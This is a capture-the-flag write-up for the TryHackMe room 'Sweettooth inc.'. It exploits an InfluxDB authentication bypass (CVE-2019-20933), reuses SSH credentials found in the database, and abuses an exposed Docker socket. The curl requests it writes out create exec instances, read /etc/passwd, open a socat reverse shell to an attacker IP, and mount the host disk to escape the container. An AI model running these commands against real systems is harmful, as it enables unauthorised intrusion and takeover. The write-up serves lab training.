Room: [Sweettooth inc.](https://tryhackme.com/room/sweettoothinc)

Difficulty: Medium

Overview: In this room we’ll be taking advantage of a misconfigured InfluxDB database, through a authentication bypass vulnerability we can access its contents. This will leads us to a docker container where we are going to privesc to root and later on escape from the container.     

------------------------------------------------------------------------------------------------------------------------------------------------------------------

Let's start our enumeration by running nmap to scan for all open ports on the target system:

```
nmap -sV -sC -p- sweettooth.thm -oN nmap.txt

-sV → Probe open ports to determine service
-sC → Scan using the default set of scripts
-p- → Scan all ports
-oN → Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/129366754-074d8008-c44e-4156-86bb-d6ef40048684.png)

We found four open ports on the target system:

111   → rpcbind

2222  → OpenSSH 6.7.p1

8086  → InfluxDB 1.3.0

56841 → RPC

There is a database running on the target system, lets see if we can fuzz any directories or files through wfuzz:

![image](https://user-images.githubusercontent.com/76821053/129366844-fe96e3fc-7fdc-4c06-a6ba-4ab7a99580d7.png)

I didn't found much but i got a response from “query”. So maybe there is a way to query the database to see if there is any information that could be usefull.

After searching online for a vulnerability or exploit i found out that there is a CVE number CVE-2019-20933.  So for all InfluxDB versions below v1.7.6 there is a authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

We can find an awesome exploit from LorenzoTullini [github](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) to exploit the target system. Even though the script can brute force users, it couldn't find one for this database. 

After looking at the documentation of InfluxDB there is a path that queries users:

![image](https://user-images.githubusercontent.com/76821053/129366896-c28c6cee-406a-45f3-bc14-9f4156b401b9.png)

```
curl http://influxDb:8086/debug/requests
```

![image](https://user-images.githubusercontent.com/76821053/129366929-c8e9f596-5654-4f40-8d8d-fd30cddce56d.png)

With curl we found the user needed to exploit influxDB version 1.3.0.  Now we can just run the CVE-2019-20933 influxDB exploit:

![image](https://user-images.githubusercontent.com/76821053/129366964-54d011b5-1152-49f8-b413-38710650c88b.png)

Inside the way we move through the database is through some basic commands like:

```
Type database name to access it, example: tanks
To exit that database just write “exit”
To access the contents of the database : SHOW measurements
To select any columns from tables or database: SELECT * FROM (database/table)
```

To find the temperature of the water tank we need to query the database tanks. 

![image](https://user-images.githubusercontent.com/76821053/129366985-dc8a78f1-95f1-4943-9dce-e4f5d3217c2f.png)

```
SHOW measurements
SELECT * FROM water_tank
```

![image](https://user-images.githubusercontent.com/76821053/129367051-84d52996-377e-4724-a87a-c20c69aef9f5.png)

We need to convert this 1621346400 UTC Unix Timestamp to ISO 8601 to find the matching time line. And for that you can use this [website](https://www.unixtimestamp.com/).

![image](https://user-images.githubusercontent.com/76821053/129367087-a8757f2b-64ad-4f1d-b4a6-fa17b8c8d4be.png)

Same process to find rpm:

```
Type "mixer" to select database
SELECT * FROM mixer_stats
```

![image](https://user-images.githubusercontent.com/76821053/129367322-8dd06729-1958-4696-8c7f-45d0366ad201.png)

There are a database called “creds” and when checking it there is some ssh credentials inside:

```
SELECT * FROM ssh
```

![image](https://user-images.githubusercontent.com/76821053/129367477-0008dfc2-4fea-455f-bfd9-0400b234ca32.png)

With the credentials that we found we can login to the machine through ssh:

![image](https://user-images.githubusercontent.com/76821053/129367501-19c95d4a-a6cc-4f9d-815e-65938eee2aac.png)

To better enumerate the system i uploaded linpeas to automate the process.

We can setup a python http webserver and host linpeas.sh inside:

```
python -m SimpleHTTPServer
```

![image](https://user-images.githubusercontent.com/76821053/129367542-332de915-4507-470a-9c5f-b2d71dd72cf9.png)

From the target machine we can just use a few commands to download linpeas and make executable:

```
wget http://your_host_ip_address:8000/linpeas.sh

chmod +x linpeas.sh
```

![image](https://user-images.githubusercontent.com/76821053/129367579-4701379c-8b79-4482-8f0f-a05c435f7b66.png)

I normally upload files to /tmp folder, since it removes all its contents at restart:

![image](https://user-images.githubusercontent.com/76821053/129367614-6d1856cb-f9b9-4f17-9907-54bec32bcfd1.png)

This linux kernel version is vulnerable to [Dirtyc0w](https://dirtycow.ninja/) exploit, but this machine has alot of missing tools like gcc or sudo so we cannot exploit it this way.

![image](https://user-images.githubusercontent.com/76821053/129367644-d6f00e3c-318c-4ab8-9ebe-249d54229428.png)

As we can see here a socat service is running in port 8080 which is very interesting:

![image](https://user-images.githubusercontent.com/76821053/129367761-a5d7087e-ecff-4e8f-acd3-b01789def9c4.png)

And since /var/run/docker.dock is vulnerable. We are going to privesc with a docker container. 

![image](https://user-images.githubusercontent.com/76821053/129367805-9f692b87-7d09-4558-8c26-5a04ad92942e.png)

You can check this [webpage](https://dejandayoff.com/the-danger-of-exposing-docker.sock/) has as reference in how to take advantage of docker's /var/run/docker.sock vulnerability:

Start by doing a simple curl command to the local webserver, the one that had socat service running on it:

![image](https://user-images.githubusercontent.com/76821053/129367841-c3ae9338-1aff-4d1b-af00-a8e680bc243c.png)

I used [prettier website](https://prettier.io/) to clean the response of the server:

![image](https://user-images.githubusercontent.com/76821053/129367869-d80ea512-9805-4ef0-8ed8-e3ebed87e5f8.png)

We have found a docker container with this information:

id: d01b55f75b089aea8d3a9516da167d3c4d2fe76e8d01b868f1c92915c1e311da

name: /sweettoothinc

image: sweettoothinc:latest

Having the id information of a docker container we will create an “exec” instance. This has to be done in order to run commands in this docker container:

```
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://<docker_host>:PORT/containers/<container_id>/exec

docker_host: localhost
port:8080
container_id: febb84cfadcf26debd379329d6da0e8902873c4ec29c148c27e632fa7809146a
```

![image](https://user-images.githubusercontent.com/76821053/129367921-d8003270-8e2e-4d68-9bc2-c1aea59a68c8.png)

We recieved a new id from the instance that we have created. Now we need to start the exec instance with the new ID that we recieve:

```
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"Detach": false,"Tty": false}' \
http://localhost:8080/exec/NEW_INSTANCE_ID/start

NEW_INSTANCE_ID: 567efc78b6e1184e8b5949f989c37c564b93b2d73ccf168d5120dc5590edd5aa
```

![image](https://user-images.githubusercontent.com/76821053/129367958-71da62a4-ef79-4695-a273-046c39bf6dd6.png)

Success we recieved the contents of /etc/passwd of the docker container. Let's try to change the command to get a reverse shell connection.

Start from the begining and pay attention to the new ID's:

```
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["socat", “TCP4:<MY_IP>:<PORT>”, “EXEC:bash” ],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://<docker_host>:PORT/containers/<container_id>/exec

Cmd: “socat”, “TCP4:my_ip:9001”, “EXEC:bash”
container_id: febb84cfadcf26debd379329d6da0e8902873c4ec29c148c27e632fa7809146a
```

![image](https://user-images.githubusercontent.com/76821053/129367983-11c815c8-9fdb-485a-aa7f-e6afed8b9db0.png)

Now to trigger the payload:

```
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"Detach": false,"Tty": false}' \
http://localhost:8080/exec/NEW_INSTANCE_ID/start

NEW_INSTANCE_ID: e2891dbe24540b0d9b480ad1092ce03509fca95cb3a4298910266c78961b95d8
```

![image](https://user-images.githubusercontent.com/76821053/129368025-285d2e7f-78f0-4328-b6af-d247d7257bf1.png)

And in my netcat listener i received a reverse shell!

![image](https://user-images.githubusercontent.com/76821053/129368076-d8f74568-e102-42cf-a837-fa7436d6654b.png)

The root.txt flag is in /root directory:

![image](https://user-images.githubusercontent.com/76821053/129368101-33a04369-cfc7-4421-95a5-bdce7ab286ac.png)

Since we are "root" user we can escape easily from this container and read the contents of the host root.txt file.  Check [book.hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout) website for more details.

This docker container if missconfigured and let us do commands like “fdisk -l”, which means that it is possible to get the privileges to access the hosts drive.

![image](https://user-images.githubusercontent.com/76821053/129368137-e3861fea-bcbc-468d-825e-95357bc28011.png)

Now we can takeover the hosts disk machine just by mounting it in whatever directory we want:

```
mkdir -p /tmp/escape
mount /dev/xvda1 /tmp/escape
```

After mounted we can just browse through it and find our last flag at /tmp/escape/root directory!

![image](https://user-images.githubusercontent.com/76821053/129368200-62d59491-acba-41b4-87bf-81d5d87c2a5d.png)
















